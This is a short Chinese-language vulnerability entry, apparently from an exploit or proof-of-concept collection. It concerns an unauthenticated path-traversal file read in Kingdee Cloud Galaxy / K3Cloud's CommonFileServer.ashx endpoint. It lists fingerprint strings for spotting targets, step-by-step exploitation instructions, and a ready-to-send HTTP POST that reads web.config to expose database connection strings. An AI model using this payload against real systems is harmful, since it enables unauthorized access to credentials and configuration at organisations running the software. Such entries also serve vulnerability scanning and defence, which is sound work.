---
id: KINGDEE-CLOUD-FILE-READ
title: 金蝶云星空 CommonFileServer 任意文件读取
product: kingdee
vendor: 金蝶软件
version_affected: "云星空, K3Cloud"
severity: HIGH
tags: [file_read, 无需认证, 国产, erp]
fingerprint: ["金蝶", "Kingdee", "K3Cloud", "CommonFileServer"]
---

## 漏洞描述

金蝶云星空 CommonFileServer.ashx 接口存在路径穿越文件读取漏洞，可读取 web.config 等敏感配置文件。

## 影响版本

- 云星空
- K3Cloud

## 前置条件

- 无需认证，目标开放 `/K3Cloud/CommonFileServer.ashx` 接口

## 利用步骤

1. 确认目标为金蝶云星空/K3Cloud，访问 `/K3Cloud/` 确认指纹
2. 向 `CommonFileServer.ashx` 发送 POST 请求，通过 `filePath` 参数路径穿越读取敏感文件
3. 检查响应内容中是否包含 `web.config` 数据库连接串等敏感信息

## Payload

```http
POST /K3Cloud/CommonFileServer.ashx HTTP/1.1
Host: target
Content-Type: application/json

{"filePath":"../../../../web.config","action":"download"}
```

## 验证方法

响应中包含 web.config 文件内容（数据库连接串等）。
